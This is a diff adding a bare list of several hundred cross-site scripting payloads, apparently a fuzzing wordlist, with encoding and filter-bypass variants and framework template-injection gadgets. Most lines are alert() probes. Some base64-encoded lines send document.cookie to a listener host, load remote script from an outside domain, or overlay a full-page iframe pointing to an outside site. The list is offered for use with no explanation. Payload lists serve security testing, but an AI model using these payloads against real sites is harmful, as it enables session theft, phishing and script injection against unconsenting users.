@@ -1,0 +1,599 @@
+<script>alert(###)</script>
+"><svg onload=alert(###)>
+<img src=1 onerror=alert(###)>
+<img src=x onerror=alert(###)>
+"onmouseover="alert(###)
+javascript:alert(###)
+<img/src/onerror=alert(###)>
+'-alert(###)-'
+"></select><img%20src=1%20onerror=alert(###)>
+{{$on.constructor('alert(###)')()}}
+\"-alert(###)}//
+<><img src=1 onerror=alert(###)>
+<img src=1 onerror=alert(###)>
+%27x%27onclick=%27alert(###)
+</script><script>alert(###)</script>
+\'-alert(###)//
+-alert(###)-&apos;
+javascript://%250Aalert(###)
+test<i>test</i><a onmouseover="alert(###)">
+//j\\javascript:alert(###)
+//j%5c%5cjavascript%3aalert(###)
+javascript:(alert(###))()
+"><u>XSS</u><marquee+onstart='alert(###)'>XSS
+{{window['eval'](window['atob'](window['decodeURIComponent']('Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KDEyMzQ1Njc4OTEyMyk7PjEy')))}}
+data:text/html;base64,Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KDEyMzQ1Njc4OTEyMyk7PjEy
+data:text/html;base64,Ij48c2NyaXRwPmFsZXJ0KDEyMzQ1Njc4OTEyMyk8L3NjcmlwdD4=
+///%01javascript:alert(###)/
+javascript:alert(###);
+xss"</sc"ript><sv"g/onloa"d=alert(###)>
+0xd3adc0de<ScRiPt>alert(###)</sCripT>
+0xd3adc0de&lt;ScRiPt&gt;alert(###)&lt;/sCripT&gt;
+</b><script>alert(###)</script><b><!--
+</title><script>alert(###)</script>
+ryp3i"accesskey="x"onclick="alert(###)"//opk15
+<ScRiPt>alert(###)</ScRiPt>
+"'><svg/onload=confirm(###)>
+'x'%20onclick='confirm(###)'
+'confirm(###)'>
+;</script><embed/test='asdf'/sr%00c='/'>
+"><svg onmouseover="confirm&#0000000040###)
+${alert(###)}
+d1bvs%3c%2fscript%3e%3cscript%3ealert(###)%3c%2fscript%3ec579g
+d1bvs</script><script>alert(###)</script>c579g
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520###
+javascript:var{a:onerror}={a:alert};throw%20###
+https://me6.com/aem/xss2.svg
+<Img Src=OnXSS OnError=confirm(###)>
+<img/src/onerror=setTimeout(atob(/YWxlcnQoMTIzNDU2Nzg5MTIzKQ==/.source))>
+"onmouseover="alert(###)"><!--
+<script>alert(###)</script>
+<script>prompt(###)</script>
+<ScripT>alert(###)</ScRipT>
+/<script>alert(###)</script>
+<IMG+DYNSRC="javascript:alert(###);">
+<IMG+LOWSRC="javascript:alert(###);">
+<isindex+type=image+src=1+onerror=alert(###)>
+<meta style="xss:expression(open(alert(###)))" />
+<!</textarea <body onload='alert(###)'>
+<img+<iframe ="1" onerror="alert(###)">
+<base+href="javascript:alert(###);//">
+<bgsound+src="javascript:alert(###);">
+<INPUT+TYPE="IMAGE"+SRC="javascript:alert(###);">
+<object+data="javascript:alert(###)">
+<STYLE>li+{list-style-image:url("javascript:alert(###)");}</STYLE><UL><LI>1
+%3E%3Cbody%20onload=javascript:alert(###)%3E
+'">><marquee><h1>###</h1></marquee>
+</br style=a:expression(alert(###))>
+<font style='color:expression(alert(###))'>
+<embed src="data:image/svg+xml;###">
+"/>%3ciframe%20src%3djavascript%3aalert%28###%29%3e
+<object><param name="src" value="javascript:alert(###)"></param></object>
+<isindex action=javascript:alert(###) type=image>
+<b/alt="1"onmouseover=InputBox+1 language=vbs>###</b>
+</a onmousemove="alert(###)">
+'%26%26'javascript:alert%25###%2529//
+<scr<script>ipt>prompt(###)</scr</script>ipt>
+12&<script>alert(###)</script>=###
+<img src=x:alert(###) onerror=eval(###) alt=0>
+<img src=/ onerror=alert(###)>
+<img/src="xss.png"alt="###">
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(###);</x:script>
+<scr<script>ipt>alert(###)</scr</script>ipt>
+%3Cscript%3Ealert(###)%3C/script%3E
+foo%00<script>alert(###)</script>
+"><<script>alert(###);//<</script>
+><s"%2b"cript>alert(###)</s"%2B"cript>
+3Cscript%3Ealert(###)%3C%2Fscript%3E
+%253Cscript%253Ealert(###)%253C/script%253E
+%3Cscript%3Ealert(###)%3C%2Fscript%3E
+%BCscript%BEalert(%A2###%A2)%BC/script%BE
+%C0%BCscript%C0%BEalert(###)%C0%BC/script%C0%BE
+<object+data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxMjM0NTY3ODkxMjMpPC9zY3JpcHQ+"></object>
+<a HREF="data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==">ugh</a>
+PHNjcmlwdD5hbGVydCgxMjM0NTY3ODkxMjMpPC9zY3JpcHQ+
+<a+href="javas&#99;ript&#35;alert(###);">
+<IMG+SRC=j&#X41vascript:alert(###)>
++ADw-SCRIPT+AD4-alert(###);+ADw-/SCRIPT+AD4-
+<INPUT+TYPE="checkbox"+onDblClick=confirm(###)>
+alert(###)</SCRIPT>
+&lt;script&gt;prompt(&apos;###&apos;)&lt;/script&gt;
+&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;###&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
+&#x60;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;&#x97;&#x108;&#x101;###&#x114;&#x116;&#x40;&#x39;&#x120;&#x115;&#x115;&#x39;&#x41;&#x60;&#x47;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;
+=<img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert%26%23x28;###%26%23x29;>
+"+style%3d"x%3aexpression(alert(###))+
+\";alert(###);//
+<img src="x:%90" title="onerror=alert(###)//">
+"+onkeypress="prompt(###)"+
+"+onfocus="prompt(###)"+
+alert(###)
+with(window)alert(###)
+";location=location.hash)//#0={};alert(###)
+";alert(###)
+"+onDblClick=prompt(###)"+
+"+onError=prompt(###)"+
+";eval(unescape(location))//#%0Aprompt(###)
+%'});%0aalert(###);%20//
+<IMG+SRC="jav&#x0A;ascript:alert(###);">
+<IMG+SRC="jav#x0D;ascript:alert(###);">
+"jav&#x09;ascript:alert(###);">
+%3Cscript%3Ealert(###)%3C/script%00TESTTEST%3E
+<script%00>alert(###)</script%00>
+<scr%00ipt>prompt(###)</sc%00ript>
+%3Cscript%0Caaaaa%3Ealert%28###%29%3C/script%0Caaaaa%3E
+%3Cscript%0Baaa%3Ealert%28###%29%3C/script%3E
+<*script>prompt(###)<*/script>
+<script%20TEST>alert(###)</script%20TESTTEST>
+<<SCRIPT>alert(###);//<</SCRIPT>
+\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e\uff41\uff4c\uff45\uff52\uff54\uff08\uff07\uff58\uff53\uff53\uff07\uff09\uff1c\uff0f\uff53\uff43\uff52\uff49\uff50\uff54\uff1e###
+%uff1cscript%uff1ealert(###)%uff1c/script%uff1e
+javascript:propmpt(###)
+javascript:eval(unescape(###))
+1&"><script>alert(###)</script>=1
+</scr</script>ipt><ifr<iframeame/onload=prompt(###)>whs
+<script>alert(###”)</script>
+<img src=x onerror=alert(###”)>
+<script>alert(###)</script>
+<img src=x onerror=alert(###)>
+<body onload=alert(###”)>
+<Script>alert(###)</Script>
+<svg/onload=alert(“###)>
+&lt;script&gt;alert(&#39;###&#39;);&lt;/script&gt;
+<img src=x onerror=alert(###) />
+<svg><script>###<1>alert(###)</script> 
+"><script>alert(###)</script>
+'><script>alert(###)</script>
+><script>alert(###)</script>
+</script><script>alert(###)</script>
+< / script ><script >alert(###)< / script >
+ onfocus=JaVaSCript:alert(###) autofocus 
+"onfocus=JaVaSCript:alert(###) autofocus 
+＜script＞alert(###)＜/script＞
+<sc<script>ript>alert(###)</sc</script>ript>
+--><script>alert(###)</script>
+";alert(###);t="
+';alert(###);t='
+JavaSCript:alert(###)
+;alert(###);
+src=JaVaSCript:prompt(132)
+"><script>alert(###);</script x="
+'><script>alert(###);</script x='
+><script>alert(###);</script x=
+" autofocus onkeyup="javascript:alert(###)
+<script\x20type="text/javascript">javascript:alert(###);</script>
+'"><\x3Cscript>javascript:alert(###)</script>        
+ABC<div style="x:expression\x5C(javascript:alert(###)">DEF
+ABC<div style="x:\xE3\x80\x80expression(javascript:alert(###)">DEF
+<a href="\x0Bjavascript:javascript:alert(###)" id="###">test</a>
+"'><img src=xxx:x \x0Aonerror=javascript:alert(###)>
+"'><script>\x3Bjavascript:alert(###)</script>
+<img \x00src=x onerror="alert(###)">
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(###)>###</a>
+<img src onerror /" '"= alt=javascript:alert(###)//">
+<a href=http://foo.bar/#x=y></a><img alt="><img src=x:x onerror=javascript:alert(###)></a>">
+<!--[if]><script>javascript:alert(###)</script-->
+<!--xss"><img src=x onerror=alert(###)>-->
+<!--[if<img src=x onerror=javascript:alert(###)//]>-->
+<IMG """><SCRIPT>alert("###")</SCRIPT>">
+<IMG SRC=javascript:alert(###)>
+<IMG onmouseover="alert('###')">
+<IMG SRC="jav&#x0D;ascript:alert('###');">
+<IMG SRC="javascript:alert('###')"
+<body language=vbs onload=confirm-1
+"<body/onload=&lt;!--&gt;&#10confirm(###);prompt(###)>"
+"\"><body/onload=&lt;!--&gt;&#10confirm(###);prompt(###)>",
+<button autofocus onfocus=confirm(###)>
+'"><*chr*script>log(###)</script>
+"><img src="/" =_=" title="onerror='prompt(###)'">
+<img language=vbs src=<b onerror=confirm#/###/1#>  
+"]<img src=1 onerror=confirm(###)>
+/#<img src=1 onerror=javascript:confirm(###)>
+"><img src=javascript:while([{}]);>###
+<img/ src//'onerror/''/=confirm(###)//'>
+"\"><img src=\"x\" onerror=\"confirm(###)\"/>",
+<img src=x onerror=URL='javascript:confirm(###)'>
+"><img src=x onerror=prompt(###);>
+"><img src=x onerror=confirm('###') />]
+"><img src=x onerror=prompt(###);>
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%28###%29%3B%3E
+%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dprompt%2528###%2529%253B%253E
+Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KDEyMzQ1Njc4OTEyMyk7Pg==
+<img src=xx: onerror=confirm(###)>
+<--<img/src= onerror=confirm(###)> --!>
+<img/src=x alt=confirm(###) onmouseover=eval(alt)>
+><imgsrc=x onerror=confirm.onerror=confirm(###)>
+"><input value=<><iframe/src=javascript:confirm(###)
+</plaintext\></|\><plaintext/onmouseover=prompt(###)
+"<script>1-confirm(###);</script>"/>
+"/><script>+-+-1-+-+confirm(###)</script>
+<script>(0)['constructor']['constructor']("\141\154\145\162\164(###)")();</script>
+<script>+-+-1-+-+confirm(###)</script>
+"<script>'confirm(###)%3B<%2Fscript>"
+"\"><script>'confirm(###)%3B<%2Fscript>",
+<script>'confirm(###)%3B<%2Fscript>
+"'><script>log*chr*(###)</script>
+</script><svg onload='-/"/-confirm(###)//'"
+<script>x=""-prompt(###)-"";y=42;</script>
+<svg id=1 onload=confirm(###)> 
+<svg onload=confirm(###)
+"><svg onload="confirm(###)">
+<svg onload="confirm(###)">
+<svg onload=eval(URL)>###
+<svg onload=eval(###)>
+<svg onload=eval(###)>
+\x3Cscript>javascript:alert(###)</script>
+'"><script>/* *\x2Fjavascript:alert(###)// */</script>
+<!--\x3E<img src=xxx:x onerror=javascript:alert(###)> -->
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(###)> -->
+<a href="\x1Ajavascript:javascript:alert(###)" id="fuzzelement1">###</a>
+"'><script>\x09javascript:alert(###)</script>
+<IMG SRC=javascript:alert(###)>
+<IMG SRC=javascript:alert(###)>
+<script src="data:text/javascript,alert(###)"></script>
+<iframe/src \/\/onload = prompt(###)
+<iframe/onreadystatechange=alert(###)
+<svg/onload=alert(###)
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(###)//'>
+\<a onmouseover="alert(###)"\>###\</a\>
+<IMG """><SCRIPT>alert("###")</SCRIPT>"\>
+<IMG SRC=# onmouseover="alert('###')">
+<IMG SRC= onmouseover="alert('###')">
+<IMG SRC=/ onerror="alert(###)"></img>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<IMG SRC="jav ascript:alert('###');">
+<IMG SRC="jav&#x09;ascript:alert('###');">
+<IMG SRC=" &#14; javascript:alert('###');">
+<IMG SRC="('###')"
+\";alert('###');//
+</TITLE><SCRIPT>alert("###");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('###');">
+<IMG LOWSRC="javascript:alert('###')">
+<IMG SRC='vbscript:msgbox("###")'>
+<IMG SRC="livescript:[code]">
+Set.constructoralert\x28###\x29
+<STYLE>@im\port'\ja\vasc\ript:alert("###")';</STYLE>
+<XSS STYLE="xss:expression(alert('###'))">
+<IFRAME SRC="javascript:alert('###');"></IFRAME>
+d="alert('###');\")"; 
+echo('IPT>alert("###")</SCRIPT>'); ?>
+<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))" alt="###">
+<Img src = x onerror = "javascript: window.onerror = alert; throw ###">
+<Video> <source onerror = "javascript: alert (###)">
+<Input value = "###" type = text>
+(A(%22onerror='alert%60###%60'testabcd))/
+<applet code="javascript:confirm(###);">
+<isindex x="javascript:" onmouseover="alert(###)">
+"></SCRIPT>”>’><SCRIPT>alert(###)</SCRIPT>
+"><img src="x:x" onerror="alert(###)">
+<img src="x:gif" onerror="window['al\u0065rt'](###)"></img>
+<iframe/src="data:text/html,<svg onload=alert(###)>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(###)" http-equiv="refresh"/>
+<form><a href="javascript:\u0061lert(###)">X
+</script><img/*%00/src="worksinchrome&colon;prompt(###)"/%00*/onerror='eval(src)'>
+<style>//*{x:expression(alert(/###/))}//<style></style>
+<img src="/" =_=" title="onerror='prompt(###)'">
+<script x> alert(###) </script 1=2###
+<form><button formaction=javascript&colon;alert(###)>CLICKME
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;###&rpar;"
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E" title="###"></iframe>
+a=alert,a(###)
+[###].find(alert)
+top[“al”+”ert”](###)
+top[‘al\x65rt’](###)
+top[8680439.toString(30)](###)
+<button onClick="alert('###')">Submit</button>
+<svg><animate onend=alert(###) attributeName=x dur=1s>
+<audio src/onerror=alert(###)>
+<marquee width=1 loop=1 onfinish=alert(###)>###</marquee>
+<input onauxclick=alert(###)>
+<video onfullscreenchange=alert(###) src=validvideo.mp4 controls>
+<input oninput=alert(###) value=###>
+<xss onkeypress="alert(###)" contenteditable style=display:block>###</xss>
+<a onpaste="alert(###)" contenteditable>###</a>
+<script>\u0061lert(###)</script>
+{{_s.constructor('alert(###)')()}}
+<p v-show="_c.constructoralert(###)()">
+<x v-on:click='_b.constructoralert(###)()'>click</x>
+<x v-bind:a='_b.constructoralert(###)()'>
+<a @['c\lic\u{6b}']="_c.constructor('alert(###)')()">test</a>
+<img src @error=e=$event.path.pop().alert(###)>
+{{_openBlock.constructor('alert(###)')()}}
+{{_Vue.h.constructoralert(###)()}}
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(###)"].sort(toString.constructor);}}
+{{{}.")));alert(###)//"}}
+{}.")));alert(###)//";
+constructor.constructor('alert(###)')()
+';window['ale'+'rt'](###);//
+';self['ale'+'rt'](###);//
+/%2527)%253B%2520alert(###)%253B%252F%252F
+al\u0065rt(###)
+"><details/open/ontoggle=prompt("/###/")>
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click###
+%3Cscript%3Efor((###)in(self))eval(###)(${###})%3C/script%3E
+img{background-image:url('javascript:alert(###)')}
+<body/onload=&lt;!--&gt;&#10alert(###)>
+<IMG SRC=”javascript:alert(###’)”
+"><script>alert(###)</script>
+<span/onmouseover=confirm(###)>xss
+<a onmouseover%3D"alert(###)">xss
+'?prompt1?'###
+"])},alert(###));(function xss() {//
+""});});});alert(###);$('a').each(function(i){$(this).click(function(event){x({y
+"}]}';alert(###);{{'
+11111';\u006F\u006E\u0065rror=\u0063onfirm; throw'###
+\');confirm(###);//
+x");$=alert, $(###);//
+'|alert(###)|'
+'*prompt(###)*'
+';a=prompt,a(###)//
+'-eval("window['pro'%2B'mpt'](###)")-'
+"><details/open/ontoggle=confirm("/###/")>
+confirm(###)
+confirm`###`
+(confirm)(###)
+setInterval('ale'+'rt(###)');
+<html ontouchmove=alert(###)>
+<svg onload=alert(###)>
+%253Csvg%2520o%256Enoad%253Dalert%2528###%2529%253E
+%2522%253E%253Csvg%2520o%256Enoad%253Dalert%2528###%2529%253E
+javascript:x='%27-alert(###)-%27';
+%3Cscript%3Ealert(###)%3C/script%3E##1
+x=alert,x(###)
+(alert)(###)
+"/><img/onerror=\x22javascript:alert(###)\x22src=xxx:x />
+"'><script>\xEF\xBF\xAEjavascript:alert(###)</script>
+<sVg oNloaD=write(###)>
+\xE2\x81\x9Fjavascript:javascript:confirm(###)
+asd"> onpointerenter=x=prompt,xXSS###
+<x onauxclick=import('//###/')>click
+\"<>onauxclick<>=(eval)(atob(cHJvbXB0KDEyMzQ1Njc4OTEyMyk=))>+<sss###
+{{constructor.constructor(alert)(###)}}
+javascript:new%20Functional\ert\###\`;
+<a"/onclick=(confirm)(###)>Click Here!###
+<svg onload=prompt%26%230000000040###)>
+xss'"><iframe srcdoc='%26lt;script>;prompt${###}%26lt;/script>'>
+<--%253cimg%20onerror=alert(###)%20src=a%253e --!>
+javascript:{ alert(###) }
+<img src=x onError=import('//###/')>
+%2sscript%2ualert(###)%2s/script%2u
+<svg on onload=(alert)(###)>
+<img ignored=() src=x onerror=prompt(###)>
+<svg onx=() onload=(confirm)(###)>
+“><img%20src=x%20onmouseover=prompt%26%23###;###%26%2300000000000000000041;
+test",prompt%0A/*HelloWorld*/(###)
+"onx+%00+onpointerenter%3dalert(###)+x"
+%27%09);%0d%0a%09%09[###].find(alert)//
+"><img src=1 onerror=alert(###) alt=###>
+<svg/on%20onload=alert(###)>
+<img/src=x onError="${x};alert(###);"> 
+">'><details/open/ontoggle=confirm('###')>
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(###)%3E/
+tarun"><x/onafterscriptexecute=confirm%26lpar;###)// 
+<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='test'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />tap###
+'-[###].map(alert)-'
+<svg onload\r\n=$.globalEval("al"+"ert(###)");>
+<img/src=q onerror='new Functional\ert\###\`'>
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert`###`'";>
+ax6zt%2522%253e%253cscript%253ealert%2528###%2529%253c%252fscript%253ey6uu6
+<meter onmouseover="alert(###)"
+'">><div><meter onmouseover="alert(###)"</div>"
+<a href=&#01javascript:alert(###)>
+[][“\146\151\154\164\145\162”][“\143\157\156\163\164\162\165\143\164\157\162”](“\145\166\141\154\50\141\164\157\142\50\42\131\127\170\154\143\156\121\157\115\123\153\75\42\51\51”)()/*###
+[]["filter"]["constructor"]("alert(###)")()
+/%09/javascript:alert(###)
+<!--*/!'*/!>%0D<svg/onload=confirm'###'//
+1"><%3Csvg onload=alert%28###%29>'
+/";%20confirm(###);%20//
+%22%3e%3c%5K/onwheel=alert(###)%3emouse%20wheel%20here%3c%21--
+%22})))}catch(e){alert(###);}//
+%22-confirm(#)-%22
+//%250Aalert?.(#)//
+%253Cscript%253Ealert('###')%253C%252Fscript%253E
+%253Csvg%2520o%256Enoad%253Dalert%2528###%2529%253E 
+%3Cscript%3Ealert%28%22###%22%29%3B%3C%2fscript%3E                                      
+%3cscript%3ealert(###)%3c/script>
+'>alert(###)</script><script/1=' 
+-alert(###)/
+";a=prompt,a(###)//
+"]);}catch(e){}if(!self.a)self.a=!alert(###);//
+'-confirm(###)-'
+data:text/html,<script>alert(###)</script>
+foo<script>alert(###)</script>
+<html ontouchstart=alert(###)>
+<iframe src=javascript:alert(###)> 
+"><img src=1 onerror=alert(###)>.gif
+"><img src=x onerror=alert(###);>
+/"><img src=y onerror=###>
+<input onfocus="alert(###);" autofocus>
+&lt;img src=# onerror=alert(###)&gt;     
+">><marquee><img src=x onerror=###></marquee>" 
+<marquee onstart=alert(###)>
+onerror=alert(0);> 
+onerror=alert();><script>alert();</script>
+p=-alert(###)”>’onload=”<svg/1=’
+p=<svg/1='&q='onload=alert(###)>
+redirect_url=javscript:alert(###)
+<ScRiPt>alert(###)</sCriPt>
+<svg/onload=alert(###)>"@gmail.com
+"/><svg/onload=prompt(###)>
+test%22%7D%29%3B%7D%29%3Balert%28###%29%3B%2f%2f
+test123";(alert)("###")//
+<x onmouseup=alert(###)>click this! 
+{alert('###')}
+jane('"><script>alert(###)</script>)@gmail.com
+<!--><svg onload=alert(###)-->
+alert`###`
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(###)//'>
+${alert(###)}
+"oncut=alert(###)
+"><img+src=x+onerror=alert(###)>  
+<scr\uffffipt>alert(#)</script>
+&lt;img src=x onerror=alert(###)&gt; 
+1337 '><marquee onstart="[###].find(confirm)">
+';alert(###)//';alert(###)//";alert(String.fromCharCode (88,83,83))//";alert(###)//-- ></SCRIPT>">'><SCRIPT>alert(###) </SCRIPT>
+\><plaintext/onmouseover=prompt(###) 
+a=\u003c,b=\u003e,location=javascript:[].findIndex(dump)+(/${a}img src=# onerror=alert(###)${b}/.source)
+'-###-
+"-###-"
+'-confirm(###)-'
+%22%3E%3Cimg%20src=x%20onerror=confirm%28###%29;%3E
+');###;//
+setIntervalalert\x28###\x29
+<a href="data:text/html;charset=utf-7;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">###</a> { Data URI XSS: data:text/html;charset=utf-7;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4= (PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=) : <script>alert('XSS')</script> }
+window.name='javascript:alert\x28###\x29';
+Reflect.set.call${location}${'href'}${###}
+Reflect.apply.call${alert}${undefined}${[###]}
+[].sort.call${alert}###
+throw onerror=eval,SyntaxErroralert\x28###\x29 
+<object src=1 href=1 onerror="javascript:alert(###)"></object>
+<html onMouseMove html onMouseMove="javascript:javascript:alert(###)"></html onMouseMove>
+"'><script>\xE2\x80\xAFjavascript:alert(###)</script>
+"'><img src=xxx:x onerror\x0C=javascript:alert(###)>
+%22%3E%3Cli%20style=list-style:url()%20onerror=javascript:alert(###)%3E%20%3Cdiv%20sty
+&ltscr\x00ipt&gtalert('###')&lt/scr\x00ipt&gt
+&ltScRiPt&gtalert('###');&lt/ScRiPt&gt
+<iframe/onload=alert(###);>
+setTimeout('ale'+'rt(###)');
+top['alert'](###)
+'te' / alert('###') / 'xt';
+></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(###)>
+'-alert(###)-'
+',document.location='javascript:###','
+blalala');alert(###);('a
+eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))”> <iframe alt=###>
+"><script>alert(###”)</script>jnyf0
+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==###
+#><img src=x onerror=prompt(###);>
+<IMG SRC=javascript:alert('###')> 
+<IMG SRC=javascript:alert(###)> 
+<<SCRIPT>alert("###");//<</SCRIPT> 
+<SCRIPT SRC=https://xss.rocks/xss.js?< B > ###</ B ></SCRIPT>
+<BODY ONLOAD=alert('###')> 
+<TABLE BACKGROUND="javascript:alert('###')">  
+</script><script>alert(###)</script> 
+<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(###)>    
+<img/src="x"/onerror="[###]"> 
+%3cscript%3ealert(###)%3c/script> 
+"}]}';</script><script>alert('###')</script>
+</script><script>alert('###')</script>                     
+"}]}';alert('###')</script>
+&lt;img src=# onerror=alert(###)&gt; 
+"%2Bself[%2F*foo*%2F'alert'%2F*###*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'###'+'.'+x1+c">
+"*alert(###)*"
+<s<script>cript>alert(###)</s<script>cript>
+alert23###
+eval.call${'alert\x28###\x29'}
+setTimeoutalert\x28###\x29
+onerror=alert;throw ###;
+param A=<script>alert("###
+#*/###
+javascript:%61lert(###)
+'';!--"<###>=&{()}
+<IMG SRC="javascript:alert('###');">
+x"><x a="><script>alert(###)</script>
+###hi"><style>body{display:none}</style>
+<a+HREF='%26%237javascrip%26%239t:alert%26lpar;###)'>
+(A(%22onerror=%22alert%60###%60%22))
+<fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074/AAAA/>###
+1'"><img/src/onerror=###|alert`>
+<svg%0Aonauxclick=0;[###].some(confirm)//
+onfocus=alert&#x00000000028;###&#x00000000029; autofocus>
+<img%20id=%26%23x101;%20src=x%20onerror=%26%23x10###;;alert1;>
+'><img+sRc=l+oNerrOr=prompt(###)+x>
+“ OnMouseOver=”prompt`###`
+"oncut="alert(###)
+xss\"\u003E\u003Ch1  onmous\u0045leave=co\u006efirm(domain)\u003ECome to Me\u003C/h1\u003E\u003Cbr\u003E\u003C!--###
+<script>window['al'+'ert'](###)</script>
+<script>top[alert](###)</script>
+<img src=x onerror="js:abc='al'+'ert(###)';eval(abc)" />
+<script>window[['conf','irm'].toString().replaceAll(',',"")](###)</script>
+%26#x6c;t;\\x73cript&#62;\\u0061lert(###)%26#x6c;t;/\\x73cript&#62;
+‘onfocus=’alert(###)’
+%2527%2520onfocus%253D%2527alert%2528###%2529%2527%2520
+‘ onfocus=’alert(###)’ autofocus=’
+<img%20src=x%20onerror=”%26%2397%26%23108%26%23101%26%23114%26%23116(###)”>
+"><div class=progress><div onwebkitanimationstart=prompt(###)>
+/on<script>load=prompt(###);>
+quot;">"onmousemove=alert('###');"@evil.com</a>
+“javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520###”
+“javascript:var{a:onerror}={a:alert};throw%20###”
+?msg=<img/src=%00%20onerror=this.onerror=###
+<img/src=%00%20onerror=this.onerror=###
+<svg><script%20?>###
+<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>###
+<svg/onload=eval(atob(‘YWxlcnQoZG9jdW1lbnQuY29va2llKQ==’))>###
+qwe"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>###
+';window/*aabb*/['al'%2b'ert'](###);//
+anything&callback=%22;alert%60###%60;%2f%2f
+anything&callback=";alert`###`;//
+<%<script>alert(###)</script>
+" onload=alert&#0000000040###) value="
+javascript%3Avar%7Ba%3Aonerror%7D%3D%7Ba%3Aalert%7D%3Bthrow%2520###
+"><img src="x" onerror=alert(###) />
+<script>alert(###)</script>”/></style>
+alert(###)
+/*alert(###)*/
+console.log(###)
+xss=*/prompt("###")/*&
+<script>alert(/###/);</script>
+javascript:document.getElementsByTagName(%60body%60)%5B0%5D.innerHTML=%60%3Ch1%3E###%3C/h1%3E%60//
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veTEueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veTEueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>###
+”><svg onload=alert&#0000000040"###")>
+"><img%20src=x%20onerror="alert(%27###%27)"
+asdf"onload%3d"alert('###')"asdf
+{{$emit.constructoralert(###)()}}
+<a href=”javas cript:alert(###)” >### </a>
+"><img src="x" onerror="document.write(document.write(eval(atob('JzxpZnJhbWUgc3JjPSJodHRwczovL2Nvay5raW0vP2VtYWlsPScrZG9jdW1lbnQudGl0bGUrJyIgc3R5bGU9ImJvcmRlcjogMDsgcG9zaXRpb246Zml4ZWQ7IHRvcDowOyBsZWZ0OjA7IHJpZ2h0OjA7IGJvdHRvbTowOyB3aWR0aDoxMDAlOyBoZWlnaHQ6MTAwJSI+Jw==')))" alt="###">
+perpage=1"><Svg Only=1 OnLoad=confirm(###)>
+' onfocus='alert(###)'
+%2527%2520onmouseover%253D%2527alert%2528###%2529%2527%2520
+<svg onload=prompt&#0000000040###)> 
+<svg onload=prompt&#0000000040###)> Hex: <svg onload=prompt&#x000000028;###)>
+<audio src(unknown) onerror="alert(###)">
+\"><iframe/src=javascript:alert%26%###x000000028%3b)>
+<img+src=1+onerror=alert(###)>&anything_else=test
+%22%3E%3Csvg%20onmouseover%3d%22confirm%26%###0000000040###)
+test';alert`###`;a='test
